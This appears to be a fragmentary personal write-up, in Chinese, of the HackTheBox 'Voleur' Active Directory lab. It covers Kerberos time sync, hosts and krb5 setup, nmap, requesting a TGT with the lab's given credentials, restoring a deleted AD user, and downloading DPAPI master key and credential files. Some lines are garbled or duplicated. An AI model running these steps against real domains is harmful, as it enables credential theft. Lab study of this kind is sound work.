参考文章：[HTB-Voleur · HYH's Blog](https://www.hyhforever.top/posts/2025/07/htb-voleur/#secrets-dump)
坑点（操作过程中的）：
执行与域控（dns服务器）请求交互的动作命令前一定记得同步域时间
```bash
ntpdate  <域控IP>
```
命令klist，可以查看当前机器使用的tgt票据信息。
与域控服务器dns请求时可以修改配置文件，找不到或者解析不了域名：
```txt
cat /etc/krb5.conf

[libdefaults]
        default_realm = VOLEUR.HTB
        dns_lookup_realm = true
        dns_lookup_kdc = true

[realms]
        VOLEUR.HTB={
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
        }

[domain_realm]
        .voleur.htb=VOLEUR.HTB
        voleur.htb=VOLEUR.HTB

```

```txt
cat /etc/hosts    
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
Title
10.10.11.76 dc.voleur.htb 
10.10.11.76 voleur.htb 
10.10.11.76 VOLEUR.HTB 
10.10.11.76 DC.VOLEUR.HTB

```


## 信息收集
连上靶机，ping 一下靶机是否能访问
![[assets/Voleur/Voleur-20250826.png]]
### 初始账户密码：
> [!NOTE] 
> ryan.naylor
> HollowOct31Nyt
> 

### nmap
```bash
nmap -sV 10.10.11.76
```
![[assets/Voleur/Voleur-20250826 1.png]]
### 修改 hosts 文件
```bash
vim /etc/hosts
```

> [!NOTE] Title
> 10.10.11.76   voleur. Htb  dc. Voleur. Htb
### 对齐域控时间

对齐时间对进行 kerberos 认证时间很重要。**攻击机和域控的系统时间相差太大（默认超过 5 分钟）**，Kerberos 协议就会拒绝请求票据等认证请求。
```bash
//更改系统时区
sudo timedatectl set-timezone UTC

//停止时间同步服务再执行 ntpdate：
sudo systemctl stop systemd-timesyncd
sudo ntpdate 10.10.11.76
date
s```

无法直接使用密码认证，这里请求一下票据
```bash
impacket-getTGT voleur.htb/'ryan.naylor':'HollowOct31Nyt'
```



```
Get-ADObject -Filter 'isDeleted -eq $true -and Name -like "*Todd Wolfe*"' -IncludeDeletedObjects | Restore-ADObject
```

Get /Second-Line Support/Archived Users/todd. Wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134 f-4 c 63-b 93 c-ce 52 efc 0 aa 88

Get /Second-Line Support/Archived Users/todd. Wolfe/AppData/Roaming/Microsoft/Credentials/772275 FAD 58525253490 A 9 B 0039791 D 3
```shell
get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5-21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88


get /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3

```
